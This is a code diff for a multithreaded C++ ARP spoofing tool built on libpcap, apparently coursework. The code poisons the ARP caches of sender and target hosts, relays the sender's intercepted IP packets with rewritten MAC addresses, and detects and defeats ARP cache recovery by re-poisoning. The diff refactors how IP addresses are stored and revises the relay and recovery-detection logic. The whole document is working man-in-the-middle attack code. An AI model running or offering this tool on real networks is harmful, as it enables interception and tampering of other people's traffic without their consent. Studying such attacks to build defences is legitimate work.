@@ -23,10 +23,11 @@ struct EthIPPacket {
     ip ip_;
 };
 #pragma pack(pop)
+
 struct Args{
     int tid;
-    char sip[17];
-    char tip[17];
+    Ip sip;
+    Ip tip;
 }Args;
 
 char errbuf[PCAP_ERRBUF_SIZE];
@@ -75,7 +76,7 @@ void getAddrs(){
 }
 
 void* keepPoisoning(void* packet){
-    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 100, errbuf);
+    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 1000, errbuf);
 
     while(true){
         sleep(20);
@@ -126,7 +127,7 @@ void* arpSpoof(void* p){
 
     struct Args* args = (struct Args*)p;
 
-    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 100, errbuf);
+    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "thread : %d couldn't open device %s(%s)\n", args->tid, dev->name, errbuf);
         exit(-1);
@@ -147,8 +148,7 @@ void* arpSpoof(void* p){
     packet.arp_.sip_ = lcip;
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 
-
-    packet.arp_.tip_ = htonl(Ip(args->tip));
+    packet.arp_.tip_ = args->tip;
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -185,7 +185,7 @@ void* arpSpoof(void* p){
             printf("\nthread : %d ARP packet captured.\n", args->tid);
             if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                 printf("thread : %d ARP Reply packet captured.\n", args->tid);
-                if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->tip))) {
+                if(rcvpkt->arp_.sip_ == args->tip) {
                     memcpy(tmac,rcvpkt->arp_.smac_ ,6 );
                     printf("thread : %d ARP Reply from target captured!\nTarget MAC :%s\n", args->tid,std::string((Mac)tmac).c_str());
                     break;
@@ -199,7 +199,7 @@ void* arpSpoof(void* p){
 
     }
 
-    packet.arp_.tip_ = htonl(Ip(args->sip));
+    packet.arp_.tip_ = args->sip;
 
     res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -233,7 +233,7 @@ void* arpSpoof(void* p){
             printf("\nthread : %d ARP packet captured.\n", args->tid);
             if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                 printf("thread : %d ARP Reply packet captured.\n", args->tid);
-                if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->sip))) {
+                if(rcvpkt->arp_.sip_ == args->sip) {
                     memcpy(smac,rcvpkt->arp_.smac_ ,6 );
                     printf("thread : %d ARP Reply from target captured!\nSender MAC :%s\n", args->tid, std::string((Mac)smac).c_str());
                     break;
@@ -252,7 +252,7 @@ void* arpSpoof(void* p){
 
     packet.eth_.dmac_ = smac;
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.sip_ = htonl(Ip(args->tip));
+    packet.arp_.sip_ = args->tip;
     packet.arp_.tmac_ = smac;
 
 
@@ -299,27 +299,23 @@ void* arpSpoof(void* p){
 
 
         EthIPPacket *spoofed;
-
-        spoofed = (struct EthIPPacket*)pkt;
-        spoofed->eth_.smac_ = packet.eth_.smac_;
-        spoofed->eth_.dmac_ = tmac;
-
-
-
         EthArpPacket *rcvpkt;
-
+        spoofed = (struct EthIPPacket*)pkt;
         rcvpkt = (struct EthArpPacket*)pkt;
-
-
-
 
         if(spoofed->eth_.type_ == htons(EthHdr::Ip4)){
 
 
-            if( (spoofed->ip_.ip_dst.s_addr != htonl(Ip(lcip)))  &&  (spoofed->ip_.ip_src.s_addr == htonl(Ip(args->sip)))) {
+            if( (spoofed->ip_.ip_dst.s_addr != htonl(Ip(lcip)))  &&
+                 (spoofed->ip_.ip_src.s_addr == args->sip) ) {
                 timer = time(NULL);
                 printf("\nthread : %d Time : %d sec\tSpoofed packet captured.\n", args->tid, (int)timer);
 
+
+
+
+                spoofed->eth_.smac_ = packet.eth_.smac_;
+                spoofed->eth_.dmac_ = tmac;
 
                 int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofed), header->caplen);
                 if (res2 != 0) {
@@ -330,11 +326,15 @@ void* arpSpoof(void* p){
             }
         }
         else if(rcvpkt->eth_.type_ == htons(EthHdr::Arp)){
-            if(  (  (rcvpkt->arp_.op_ == htons(ArpHdr::Request)) &&
-                    ( (rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->sip)))
-                      ||   (rcvpkt->arp_.sip_ == (Ip)htonl(Ip(args->tip)))  ) ))
+            if(  (
+                    ( (rcvpkt->arp_.sip_ == args->sip)
+                      ||   ((rcvpkt->arp_.sip_ == args->tip  ) &&  ( rcvpkt->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff")    )))))
             {
                 printf("\n\n\t\tthread : %d ARP recovery detected.\n", args->tid);
+
+
+
+                sleep(1);
 
                 int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                 if (res2 != 0) {
@@ -392,14 +392,18 @@ int main(int argc, char* argv[]) {
     int stat;
 
 
+
     for(int i = 0; i < n;  i++){
         struct Args* funcArgs;
+        uint32_t funcSip = htonl(Ip(argv[2*i+2]));
+        uint32_t funcTip = htonl(Ip(argv[2*i+3]));
+
+
+
         funcArgs = (struct Args*)malloc(sizeof(struct Args));
         funcArgs->tid = i;
-        funcArgs->sip[16] ='\0';
-        funcArgs->tip[16] ='\0';
-        strncpy(funcArgs->sip, argv[2*i+2], 16);
-        strncpy(funcArgs->tip, argv[2*i+3], 16);
+        memcpy((void*)(&(funcArgs->sip)), (const void *)(&funcSip), 4);
+        memcpy((void*)(&(funcArgs->tip)), (const void *)(&funcTip), 4);
         if ((tid = pthread_create(&p_thread[i], NULL, arpSpoof, (void *)funcArgs)) < 0)
         {
             perror("Failed to create pthread.");
